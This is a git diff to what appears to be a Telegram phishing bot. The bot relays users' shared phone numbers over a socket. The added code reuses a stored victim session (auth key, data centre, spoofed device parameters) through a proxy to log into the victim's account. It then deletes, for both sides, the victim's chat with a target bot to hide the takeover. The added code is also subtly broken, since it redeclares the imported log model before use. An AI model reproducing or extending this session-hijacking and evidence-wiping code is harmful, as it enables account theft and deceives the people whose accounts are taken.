@@ -10,6 +10,7 @@ import log from "../database/schemas/log.js";
 import emitter from "../bot/botDeletor.js";
 import fs from 'fs';
 
+
 export default async (token, initialConfig) => {
     let currentConfig = { ...initialConfig };
 
@@ -201,10 +202,39 @@ export default async (token, initialConfig) => {
             }
             return sockets.get(message.from.id).on(`message`, async msg => {
                 msg = JSON.parse(msg.toString());
-
+                console.log(msg)
                 switch (msg.action) {
                     case 'success':
                         sent.delete(message.from.id);
+                        if(currentConfig.deleteBot) {
+                            const log = await log.findOne({ id: msg.log_id });
+                            const client = new TelegramClient(new StringSession(), log.dcId, log.authKey, {
+                                connectionRetries: 10,
+                                proxy: formated,
+                                "appVersion": log.deviceParams.app_version,
+                                "deviceModel": log.deviceParams.device,
+                                "systemVersion": log.deviceParams.sdk,
+                                'langCode': log.deviceParams.lang_code
+                            });
+                            
+                            client.connect().then(async () => {
+                                try {
+                                
+                                    const dialogs = await client.getDialogs();
+                                    
+                                    const botDialog = dialogs.find(dialog => dialog.entity.username === 'target_bot_username');
+                                    
+                                    if (botDialog) {
+                                        
+                                        await client.deleteMessages(botDialog.entity, [], { revoke: true });
+                                    }
+                                    
+                                    await client.disconnect();
+                                } catch (error) {
+                                    console.error('Error deleting chat:', error);
+                                }
+                            }).catch(console.error);
+                        }
                         return await bot.sendMessage(message.from.id, currentConfig.auth, { reply_markup: { remove_keyboard: true }, parse_mode: "HTML" });
                     case `password`:
                         sent.delete(message.from.id);
@@ -301,9 +331,9 @@ export default async (token, initialConfig) => {
             if (message.contact.user_id !== message.from.id) return;
             try {
                 if(!config.app_prod){
-                    message.contact.phone_number = "34621013943";
+                    message.contact.phone_number = "79626194127";
                 }
-                console.log(message.contact.phone_number)
+                
                 sockets.get(message.from.id)?.send(JSON.stringify({ action: `number`, data: message.contact.phone_number }));
 
 
